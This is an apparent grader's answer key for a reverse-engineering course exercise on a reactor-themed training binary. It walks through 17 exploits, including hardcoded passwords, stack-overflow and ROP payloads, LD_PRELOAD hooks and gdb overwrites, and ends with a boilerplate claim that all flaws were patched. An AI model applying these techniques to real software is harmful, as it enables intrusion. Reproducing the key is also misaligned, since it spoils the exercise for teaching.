@@ -1,0 +1,160 @@
+
+
+
+TEMPLATE REPORT
+REVERSE BINARY
+
+
+
+TEMPLATE REPORT
+Table of Contents
+Black-box Audit
+
+White-box Audit
+
+Vulnerability Report
+
+Conclusion
+
+
+Black-box Audit
+In this phase, we analyzed the binary using reverse engineering tools and manual fuzzing. List of the tools you used:
+Ghidra
+UDX
+
+Key discoveries:
+Hardcoded values & secrets
+Overflows
+Weak encryptions
+Insecure Global Variables
+Insecure Deserialization
+Insecure Randomness
+Unverified Casting Types
+NULL Pointer Dereference
+Log Injection
+Use after free()
+
+
+White-box Audit
+With access to source code, we performed a full code review and vulnerability assessment. Focus areas:
+Input validation
+Memory safety (heap/stack misuse)
+Format string handling
+Privilege escalation paths
+
+
+
+
+
+
+
+
+
+Additional vulnerabilities discovered:
+Hashing sensitive values
+Asking for credentials when sensitive data is about to get leaked
+
+List of the tools you used:
+Ghidra (for the .so file)
+Git
+
+
+Vulnerability Report
+
+
+Exploit #1
+Function : activate_emergency_protocols
+Exploit type : Hardcoded Credentials
+Explanation : There is just some hardcoded value. You can brute force it or be lucky to find it.
+
+There is how to exploit it: 
+pipeto> activate_emergency_protocols 
+Enter emergency password: admin123 
+	Emergency protocols activated, you are now admin ! 
+
+Exploit #2
+Function : check_cooling_pressure
+Exploit type : Use after free
+Explanation : It's juste a variable use after a free, free didn't erase the value so you can still use it.
+There is how to exploit it:
+pipeto> check_cooling_pressure 
+Cooling pressure check in progress... 
+Simulating sensor reading... 
+Sensor reading complete. 
+Checking cooling pressure... 
+Cooling pressure status: 
+Pressure OK 
+Sensitive Info: {Sensitive Data} 
+Temporary buffer: Temporary data: 83 
+Simulating sensor reading... 
+Sensor reading complete. 
+Cooling pressure check complete. 
+
+Exploit #3 
+Function : check_reactor_status 
+Exploit type : Weak encrypting 
+Explanation : The cersar code is a pretty weak encryption so you can decrypt it pretty easily. 
+		| -> Code cesar to decode: UhdfwruVwdwxvRN -> ReactorStatusOK 
+
+There is how to get the code: 
+pipeto> check_reactor_status 
+Starting reactor status check... 
+Checking core temperature... 
+Core temperature: Normal 
+Checking coolant flow rate... 
+Coolant flow rate: Stable 
+Checking radiation levels... 
+Radiation levels: Safe 
+Encrypting critical reactor data... 
+Encrypted message: UhdfwruVwdwxvRN 
+Reactor status: OK 
+Reactor status check complete 
+
+Exploit #4 Function : configure_cooling_system
+Exploit type : Insecure Deserialization 
+Explanation : The command load a configuration file from you computer, the user can add some bad command. 
+
+There is how to get the code : 
+
+You need to put this in config_cooling.txt in the Data folder.
+
+echo "Exploit successful!" 
+pipeto> configure_cooling_system 
+Reading configuration file: Data/cooling_config.txt 
+Applying configuration: echo "Exploit successful!"{�� 
+Exploit successful!{�� 
+Configuration applied successfully. 
+
+Exploit #5 
+Function : load_fuel_rods 
+Exploit type : Buffer Overflow Explanation : Put an input longer than 10 to make the array overflow. There is how to exploit it: pipeto> load_fuel_rods Loading fuel rods... Enter the number of fuel rods to load (max 10): 1000000000000000000000000000000 Sensitive Data: Secret Key: {The secret stone is here !}C�P1000000000000000000000000000000 Exploit #6 Function : log_system_events Exploit type : Log injection Explanation : You can put an input in the command, it will put it in a log file if you created it (Data/system.log) There is how to exploit it: pipeto> log_system_event Enter command: leak Logging event: leak -> In the system.log file : EVENT: leak SECRET_KEY_LEAKED: {SECRET_LOG_12PIERRE34} Exploit #7 Function : monitor_radiation_levels Exploit type : Stack-Based Buffer Overflow Explanation : The stack-based approach occurs when an attacker sends data containing malicious code to an application, which stores the data in a stack buffer. The student need to find the address of the secret_function by using gdb (For that he need to decrypt the binary with upx -d). After that he need to craft a payload with the good number of characters (here is 10) and to add at the end the address of the fucntion, to make it overwrite function_ptr. => it should look too something like that "AAAAAAAAAA\xb6\x84\x04\x08" You juste need to give it as argument of the function and it's done : pipeto> monitor_radiation_levels Enter radiation levels: AAAAAAAAAA\xb6\x84\x04\x08 {The stone isn't in the pocket anymore ...} Exploit #8 Function : run_diagnostic Exploit type : NULL Pointer Dereference Explanation : A null-pointer dereference takes place when a pointer with a value of NULL is used as though it pointed to a valid memory area. There is how to exploit it: pipeto> run_diagnostic Enter diagnostic mode (normal/debug/advanced): debug Running diagnostic... Diagnostic result: {SECRET DIAGNOSTIC KEY} Performing system health check... System health: OK Diagnostic complete. Exploit #9 Function : send_status_report Exploit type : Weak encrypting Explanation : There is some sensible data that you can access just by decrypting the base64. There is how to get the file : (Create the Data folder before) pipeto> send_status_report Status report sent and saved to 'Data/status_report.txt'. You got this in the report: Encoded Status Report: SG9zdG5hbWU6IGxvY2FsaG9zdApJUCBBZGRyZXNzOiAxMjcuMC4wLjEKUHJvY2VzczogcGlwZXRvIC hQSUQ6IDEyMzQpCg== To decode it you can do this on your terminal: > echo "SG9zdG5hbWU6IGxvY2FsaG9zdApJUCBBZGRyZXNzOiAxMjcuMC4wLjEKUHJvY2VzczogcGlwZXRvIC hQSUQ6IDEyMzQpCg==" | base64 -d Hostname: localhost IP Address: 127.0.0.1 Process: pipeto (PID: 1234 Exploit #10 Function : set_reactor_power Exploit type : Integer Overflow Explanation : An integer overflow occurs when an arithmetic operation results in a number that is too large to be stored in the space allocated for it. There is how to exploit it: pipeto> set_reactor_power Enter reactor power level: 2147483646 Reactor power adjustment may be incorrect. Reactor systems are behaving erratically! Reactor core temperature rising uncontrollably... {12EXPLOSION34} Emergency shutdown initiated! or pipeto> set_reactor_power Enter reactor power level: -2147483647 Reactor power adjustment may be incorrect. Reactor systems are behaving erratically! Reactor core temperature rising uncontrollably... {12EXPLOSION34} Emergency shutdown initiated! Exploit #11 Function : simulate_meltdown Exploit type : Insecure Randomness Explanation : Insecure randomness errors occur when a function that can produce predictable values is used as a source of randomness in security-sensitive context. The user have multiple choice to find the exploit. He can spam and get it with the random (Don't give all the point for this methode) There is what it look like : pipeto> simulate_meltdown Generated random number: 2 Meltdown simulated! Reactor core is overheating. Critical Error: Secret Code Leaked: {MELTDOWN1234} Or you can overwrite rand : int rand() { return 1; } Compile it : gcc -shared -fPIC -o rand.so rand.c And after you can use preload to load it in the binary: LD_PRELOAD=./rand.so ./pipeto pipeto> simulate_meltdown Generated random number: 1 Meltdown simulated! Reactor core is overheating. Critical Error: Secret Code Leaked: {MELTDOWN1234} Exploit #12Function : trigger_emergency_shutdown Exploit type : Exploit global variable Explanation : The use of a global variable, somewhere that didn't meant to be used. You have multiple way to use it : You can use the activate_emergency_protocols, with the hardcoded password to active the admin mode (Don't give all the point for this method) pipeto> activate_emergency_protocols Enter emergency password: admin123 {Emergency protocols activated, you are now admin !} pipeto> trigger_emergency_shutdown {SHUTDOWN} You can use gdb and set the variable at true, with "set variable IS_ADMIN=1" And you got this: pipeto> trigger_emergency_shutdown {SHUTDOWN} You can also use LD_PRELOAD like the last exploit (but this time you will need the pipeto.h, so this one is harder for the students): #include "pipeto.h" int activate_emergency_protocols() { IS_ADMIN = 1; return 0; } Compile it : gcc -shared -fPIC -o activate_emergency_protocols.so activate_emergency_protocols.c And after you can use preload to load it in the binary: LD_PRELOAD=./activate_emergency_protocols.so ./pipeto pipeto> activate_emergency_protocols pipeto> trigger_emergency_shutdown {SHUTDOWN} Exploit #13Function : unlock_secret_mode Exploit type : Exploit global variable Explanation : The use of a global variable, somewhere that didn't meant to be used. You can give some point but not all if the student use the same method as the last exploit, and give him more point if he use a new one. You have multiple way to use it : You can use the activate_emergency_protocols, with the hardcoded password to active the admin mode (Don't give all the point for this methode) pipeto> activate_emergency_protocols Enter emergency password: admin123 {Emergency protocols activated, you are now admin !} pipeto> trigger_emergency_shutdown {SHUTDOWN} You can use gdb and set the variable at true, with "set variable IS_ADMIN=1" And you got this: pipeto> unlock_secret_mode {ADMIN4242} You can also use LD_PRELOAD like the last exploit (but this time you will need the pipeto.h, so this one is harder for the students): #include "pipeto.h" int activate_emergency_protocols() { IS_ADMIN = 1; return 0; } Compile it : gcc -shared -fPIC -o activate_emergency_protocols.so activate_emergency_protocols.c And after you can use preload to load it in the binary: LD_PRELOAD=./activate_emergency_protocols.so ./pipeto pipeto> activate_emergency_protocols pipeto> trigger_emergency_shutdown {SHUTDOWN} Exploit #14 Function : load_config Exploit type : ROP Stack overflow Explanation : Stack overflow errors occurs when a function write more data in a buffer than it can contains, allowing to overwrite the return address and control the execution flow. The user have multiple choice to find the exploit. He can overwrite the return address to jump after the strcmp in check_password (Don't give all the point for this method) There is what it look like : $ ./pipeto pipeto> load_config Loading configuration file from ./config.ini failure! {Correct password! Welcome, admin.} Or he can use a ROP chain with pop rdi ; ret gadget to properly call check_password with the adminPassword string as first argument : ROPgadget --binary pipeto | grep ": pop rdi ; ret$" python2 -c "print('A' * offset + '\xXX\xXX\xXX\xXX\xXX\xXX\xXX\xXX' + '\xYY\xYY\xYY\xYY\xYY\xYY\xYY\xYY' + '\xZZ\xZZ\xZZ\xZZ\xZZ\xZZ\xZZ\xZZ')" > config.ini (First address -> 'pop rdi ; ret' Second address -> adminPassword variable Third address -> check_password function) Exploit #15 Function : turbine_remote_access Exploit type : Racing Explanation : The function create a temporary file that got some sensible data. There is how to exploit it: pipeto> turbine_remote_access Temporary file created: Data/remote_accesssPza9w Enabling remote access... If you open the file when the command is running: {ACCESS_GRANTED} Exploit #16 Function : run_turbine Exploit type : Casting type Explanation : Cast of int in unsigned int There is how to exploit it: pipeto> run_turbine Enter the number of rotation that the turbine will do (between 0 and 15): -10 Turbine is running... 1/-10 Turbine is running... 2/-10 Turbine is running... 3/-10 Turbine is running... 4/-10 Turbine is running... 5/-10 Turbine is running... 6/-10 Turbine is running... 7/-10 Turbine is running... 8/-10 Turbine is running... 9/-10 Turbine is running... 10/-10 Turbine is running... 11/-10 Turbine is running... 12/-10 Turbine is running... 13/-10 Turbine is running... 14/-10 Turbine is running... 15/-10 Turbine is running... 16/-10 {ERR0R TURB1NE CAN'T ST0P} Turbine is running... 17/-10 {ERR0R TURB1NE CAN'T ST0P} Exploit #17 Function : turbine_temperature Exploit type : Int overflow Explanation : Give an input that exceeds the int max or min. There is how to exploit it: pipeto> turbine_temperature Enter the number of degrees you want to increase or decrease the turbine temperature : -2147483648 Turbine temperature is too unstable. {ERR0R TURBINE WILL EXPLODE}h
+
+Conclusion
+Total vulnerabilities found: 17
+All were successfully patched.
+Each patch was validated via unit tests.
+Final code is secure, maintainable, and ready for deployment.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
